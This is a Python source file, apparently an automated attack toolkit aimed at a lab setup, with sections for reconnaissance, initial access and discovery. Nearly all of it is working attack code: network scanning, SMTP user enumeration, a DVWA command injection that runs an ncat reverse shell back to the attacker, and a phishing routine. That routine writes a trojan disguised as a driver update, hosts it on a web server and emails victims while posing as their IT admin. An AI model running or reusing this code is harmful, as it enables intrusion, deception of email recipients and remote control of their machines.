import os
import re
import time
import json
import nmap3
import random
import socket
import threading
import tarfile
import logging
import xmltodict
import multiprocessing
from functools import partial
from colorama import Fore, Style
from socketserver import ThreadingMixIn
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer, HTTPServer
from webLib import create_driver, dvwa_login, dvwa_command_injection, change_security
from mailLib import send_mail, smtp_connect

##### RECONNAISSANCE
def scan_subnet(ip_address, netmask):
    """ Discover workstations and services subnet with nmap.
        ip_address (str): This argument specify a subnet's ip.
        netmask (str): This argument specify the subnet's netmask.

    Returns:
        list of dict: Who reprents all workstations up and their open ports.    
    """
    #### Initialise logging file
    logging.basicConfig(filename="/var/log/hacker.log", encoding="utf-8", level=logging.INFO, format="%(message)s")
    subnet = []
    nmap = nmap3.Nmap()
    if netmask == "255.255.255.0":
        netmask = "24"
    network = nmap.nmap_subnet_scan(ip_address+"/"+netmask)
    for host in network:
        try:
            socket.inet_pton(socket.AF_INET ,host)
            if ("macaddress" in network[host].keys()) and (network[host]["macaddress"] != None):
                mac = network[host]["macaddress"]["addr"]
            ports = []
            if "ports" in network[host].keys():
                for port in network[host]["ports"]:
                    if port != []:
                        ports.append(port["portid"])
            if "state" in network[host]:
                state = network[host]["state"]["state"]
            subnet.append({"mac":mac,"ip_v4":host,"ports":ports,"state":state})
            logging.info('{"function":"scan_subnet","mac":"'+mac+'","ip_v4":"'+host+'","ports":"'+str(ports)+'","state":"'+state+'"}')
        except Exception as e:
            print(e)
    return subnet

def scan_subnet_remote(client):
    """ Discover workstations and services subnet with nmap from a reverse shell on a remote workstation.
        client (socket): This argument specify a subnet's ip.

    Returns:
        list of dict: Who reprents all workstations up and their open ports.    
    """
    logging.basicConfig(filename="/var/log/hacker.log", encoding="utf-8", level=logging.INFO, format="%(message)s")
    subnet = []
    client.send(b"ip a | grep inet\n")
    response = client.recv(7168)
    re_ip = re.compile(r'(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?/\d{1,2})')
    ips = re_ip.findall(response.decode('utf-8'))
    for ip in ips:
        if "127.0.0.1"not in ip:
            client.send(b"nmap -F -oX - "+ip.encode("utf-8")+b"\n")
            response = b""
            timeout = time.time() + 60
            while True:
                response = response + client.recv(10000)
                if (b"Nmap done" in response) or (time.time() > timeout):
                    break
            nmap_output = json.loads(json.dumps(xmltodict.parse(response.decode("utf-8"))))

            arp = {}
            client.send(b"cat /sys/class/net/$(ip route list "+ip.encode("utf-8")+b" | awk '{print $3}')/address\n")
            time.sleep(5)
            response = client.recv(1024)
            arp[ip.split("/")[0]] = response.decode("utf-8").replace("\n", "")
            response = b""
            client.send(b"ip n\n")
            time.sleep(5)
            response = client.recv(5120)
            for line in response.decode("utf-8").split("\n"):
                line = line.split(" ")
                if len(line) >= 5:
                    arp[line[0]] = line[4]
            for host in nmap_output["nmaprun"]["host"]:
                try:
                    ports = []
                    if "port" not in host["ports"].keys():
                        if type(host["address"]) == type([]):
                            subnet.append({"mac":arp[host["address"][0]["@addr"]],"ip_v4":host["address"][0]["@addr"],"ports":ports,"state":host["status"]["@state"]})
                            logging.info('{"function":"scan_subnet_remote","mac":"'+arp[host["address"][0]["@addr"]]+'","ip_v4":"'+host["address"][0]["@addr"]+'","ports":'+str(ports)+',"state":"'+host["status"]["@state"]+'"}')
                        else:
                            subnet.append({"mac":arp[host["address"]["@addr"]],"ip_v4":host["address"]["@addr"],"ports":ports,"state":host["status"]["@state"]})
                            logging.info('{"function":"scan_subnet_remote","mac":"'+arp[host["address"]["@addr"]]+'","ip_v4":"'+host["address"]["@addr"]+'","ports":'+str(ports)+',"state":"'+host["status"]["@state"]+'"}')
                    else:
                        if type(host["ports"]["port"]) == type([]):
                            for port in host["ports"]["port"]:
                                ports.append(port["@portid"])
                        else:
                            ports.append(host["ports"]["port"]["@portid"])

                        if type(host["address"]) == type([]):
                            subnet.append({"mac":arp[host["address"][0]["@addr"]],"ip_v4":host["address"][0]["@addr"],"ports":ports,"state":host["status"]["@state"]})
                            logging.info('{"function":"scan_subnet_remote","mac":"'+arp[host["address"][0]["@addr"]]+'","ip_v4":"'+host["address"][0]["@addr"]+'","ports":"'+str(ports)+'","state":"'+host["status"]["@state"]+'"}')
                        else:
                            subnet.append({"mac":"","ip_v4":host["address"]["@addr"],"ports":ports,"state":host["status"]["@state"]})
                            logging.info('{"function":"scan_subnet_remote","mac":"'+arp[host["address"]["@addr"]]+'","ip_v4":"'+host["address"]["@addr"]+'","ports":"'+str(ports)+'","state":"'+host["status"]["@state"]+'"}')
                except:
                    pass
            print(Fore.GREEN+" ==> [scan_subnet_remote] Scan "+ip+" subnet!"+Style.RESET_ALL)
    return subnet

class Brute_force_email_addresses(threading.Thread):
    """ Discover workstations and services subnet with nmap from a reverse shell on a remote workstation.
        ip_address (str): This value is the ip address of smtp server to brute force.

    Returns:
        boolean    
    """
    def __init__(self, ip_address):
        threading.Thread.__init__(self)
        self.ip_address = ip_address
        self.already_return = False
        self.users_list = []

    def run(self):
        logging.basicConfig(filename="/var/log/hacker.log", encoding="utf-8", level=logging.INFO, format="%(message)s")
        smtp_session = smtp_connect(self.ip_address, verbose=False)
        if smtp_session != 1:
            #dns_resolver = dns.resolver.Resolver()
            #dns_resolver.nameservers.append("8.8.8.8")
            #file = open(wget.download("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt"))
            #dns_resolver.nameservers.remove("8.8.8.8")
            #users = file.read().split("\n")
            #users.insert(5, "ceo")
            users = ["gti@mycompany.com", "ceo@mycompany.com", "dsi@mycompany.com", "fefe@mycompany.com", "employee1@internationalcorp.com", "employee2@internationalcorp.com","user1IPN@host.com","user3IPN@host.com"]
            for user in users:
                result  = smtp_session.verify(user)
                if result[0] == 421:
                    smtp_session = smtp_connect(self.ip_address, verbose=False)
                elif result[0] == 252:
                    name = result[1].decode("utf-8").split(" ")[1]
                    self.users_list.append(name)
                    logging.info('{"function":"brute_force_email_addresses","email":"'+name+'"}')
            print(Fore.GREEN+" ==> [brute_force_email_addresses] Brute force ("+self.ip_address+") work successfully and find users: "+str(self.users_list)+" !"+Style.RESET_ALL)
            return 0
        print(Fore.RED+" ==> [brute_force_email_addresses] Brute force failed on server: "+self.ip_address+"!"+Style.RESET_ALL)
        return 1

##### INITIAL ACCESS
def dvwa_attack(url):
    """ Execute a command injection attack and create a reverse shell.
        url (str): This value is the website's url.

        Returns:
            socket: This value is the reverse between the attacker the victim's website.
    """
    try:
        #### Initialise logging file
        logging.basicConfig(filename="/var/log/hacker.log", encoding="utf-8", level=logging.INFO, format="%(asctime)s -- mail_physhing_trojan -- %(message)s")

        ##### Prepare reverse_shell hacker side
        my_port = random.randint(4000,4999)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((('',my_port)))
        s.listen(10)

        ##### Attack victim side
        base_url = url
        username = "admin"
        password = "password"
        my_ip = os.popen("hostname -I").read().split(" ")[0]
        driver = create_driver()
        driver.implicitly_wait(10)

        if dvwa_login(driver, base_url, username, password, verbose=False) == 1:
            print(Fore.RED+" ==> [dvwa_attack] Failed during login operation!"+Style.RESET_ALL)
            return 1
        change_security(driver, base_url)
        dvwa_command_injection(driver, base_url, "8.8.8.8; ncat "+my_ip+" "+str(my_port)+" -e /bin/bash", verbose=False)

        ##### Attack hacker side
        while True:
            s.settimeout(60)
            s.listen(5)
            try:
                client, address = s.accept()
            except:
                print(Fore.RED+" ==> [dvwa_attack] Attack failed!"+Style.RESET_ALL)
                driver.close()
                driver.quit()
                return 1
            if address:
                client.send(b"id\n")
            time.sleep(2)
            response = client.recv(1024)
            if response != "":
                print(Fore.GREEN+" ==> [dvwa_attack] Attack was successfull on "+url+"!"+Style.RESET_ALL)
                logging.info('{"function":"dvwa_attack","victim_ip":"'+address[0]+'", "victim_port":'+str(address[1])+', "status": "up"}')
                break

        driver.close()
        driver.quit()
        return client
    except Exception as e:
        print(e)
        return 1

class Supply_chain_attack(threading.Thread):
    def __init__(self, lib_name, port):
        threading.Thread.__init__(self)
        self.lib_name = lib_name
        self.port = port
        self.client = 1
        self.already_return = False

    def run(self):
        #### Initialise logging file
        try:
            logging.basicConfig(filename="/var/log/hacker.log", encoding="utf-8", level=logging.INFO, format="%(asctime)s -- mail_physhing_trojan -- %(message)s")
        except:
            pass

        ##### Prepare reverse_shell hacker side
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((('',int(self.port))))
        s.listen(10)

        ##### Attack hacker side
        while True:
            s.settimeout(1800)
            s.listen(5)
            try:
                client, address = s.accept()
            except:
                print(Fore.RED+"Attack failed!"+Style.RESET_ALL)
                break
            if address:
                current_time = time.strftime("%H:%M:%S", time.localtime())
                client.send(b'id\n')
            response = client.recv(1024)
            if response != "":
                print(Fore.GREEN+" ==> [Supply_chain_attack] Attack was successfull ("+self.lib_name+")!"+Style.RESET_ALL)
                logging.info('{"function":"Supply_chain_attack","victim_ip":"'+address[0]+'", "victim_port":'+str(address[1])+', "status": "up"}')
                break

        self.client = client
        return True

class Mail_physhing_trojan(threading.Thread):
    """ Send phishing email to an email victim. 
        hacker_ip (str): This value is the hacker's ip address.
        hacker_port (int): This value is hacker' port for the reverse shell.
        email_victim (str): This value is the victim's ip address.
        my_smtp_server (str): This value is the smtp server's ip address where the hacker will conect to send emails.
        email_hacker (str): This value is the hacker's ip address.

        Returns:
            Boolean: This value is the reverse between the attacker the victim's website.
    """
    def __init__(self, hacker_ip, email_victim, my_smtp_server, email_hacker):
        threading.Thread.__init__(self)
        self.hacker_ip = hacker_ip
        self.hacker_port = random.randint(4001,4999)
        self.email_victim = email_victim
        self.my_smtp_server = my_smtp_server
        self.email_hacker = email_hacker
        self.client = 1
        self.already_return = False

    def run(self):
        try:
            #### Initialise logging file
            logging.basicConfig(filename="/var/log/hacker.log", encoding="utf-8", level=logging.INFO, format="%(message)s")

            #### Create trojan
            try:
                os.mkdir("/webdriver/")
                os.system("/webdriver/driver_maj.py")
            except:
                pass

            #### Trojan file
            trojan = open("/webdriver/driver_maj_"+self.email_victim+".py", "w")
            trojan.write("import socket; import threading; import time; import subprocess\n")
            trojan.write("def trojan():\n")
            trojan.write("  s  = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
            trojan.write("  s.connect(('"+self.hacker_ip+"', "+str(self.hacker_port)+"))\n")
            trojan.write("  while True:\n")
            trojan.write("      command = s.recv(1024).decode()\n")
            trojan.write("      if 'exit' in command:\n")
            trojan.write("          break\n")
            trojan.write("      output = subprocess.getoutput(command)\n")
            trojan.write("      s.send(output.encode())\n")
            trojan.write("  s.close()\n")

            trojan.write("def fakeMaj():\n")
            trojan.write("  print('Download MAJ driver.')\n")
            trojan.write("  for i in range(11):\n")
            trojan.write("      print(i*10, '%')\n")
            trojan.write("      time.sleep(3)\n")
            trojan.write("  print('Driver have been download')\n")
            trojan.write("  print('Download MAJ driver.')\n")

            trojan.write("ttrojan = threading.Thread(target=trojan)\n")
            trojan.write("tMAJ = threading.Thread(target=fakeMaj)\n")
            trojan.write("ttrojan.start()\n")
            trojan.write("tMAJ.start()\n")
            trojan.close()

            #### Tar project
            compress_file = tarfile.open("/webdriver/driver_maj_"+self.email_victim+".tar.gz", "w:gz")
            compress_file.add("/webdriver/driver_maj_"+self.email_victim+".py")
            compress_file.close()

            #### Prepare web server thar stock trojan
            class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
                def run(self):
                    self.serve_forever()

            class SimpleHTTPRequestHandlerQuiet(SimpleHTTPRequestHandler):
                def log_message(self, format, *args):
                    pass

            try:
                handler = partial(SimpleHTTPRequestHandlerQuiet, directory="/webdriver/")
                webserver = ThreadingHTTPServer((self.hacker_ip, 80), handler)
                t = multiprocessing.Process(target=webserver.run, args=())
                t.start()
            except:
                pass

            ### Prepare smtp server for mail sending
            send_mail(smtp_server=self.my_smtp_server, FROM=self.email_hacker, TO=self.email_victim, subject="Update your drivers", msg="Hello, it's your IT admin, please download the MAJ driver and execute it for better protection againt hacker. http://"+self.hacker_ip+"/driver_maj_"+self.email_victim+".tar.gz", attachements=[], verbose=False)

            ##### Prepare reverse_shell hacker side
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind((('',int(self.hacker_port))))
                s.listen(10)
            except Exception as e:
                print(Fore.RED+" ==> [Mail_physhing_trojan] Reverse shell initialization failed!"+Style.RESET_ALL)
                return 1
            ##### Attack hacker side
            while True:
                s.settimeout(1800)
                s.listen(5)
                try:
                    client, address = s.accept()
                except:
                    print(Fore.RED+" ==> [Mail_physhing_trojan] Attack failed!"+Style.RESET_ALL)
                    return 1
                if address:
                    current_time = time.strftime("%H:%M:%S", time.localtime())
                    client.send(b'id\n')
                response = client.recv(1024)
                if response != "":
                    print(Fore.GREEN+" ==> [Mail_physhing_trojan] Attack was successfull ("+self.email_victim+")!"+Style.RESET_ALL)
                    logging.info('{"function":"mail_physhing_trojan","victim_ip":"'+address[0]+'", "victim_port":'+str(address[1])+', "status": "up"}')
                    break

            try:
                t.terminate()
                t.join()
            except Exception as E:
                pass
            self.client = client
            return True
        except Exception as e:
            print(Fore.RED+" ==> [Mail_physhing_trojan] Attack Failed!"+Style.RESET_ALL)
            return 1

#### DISCOVERY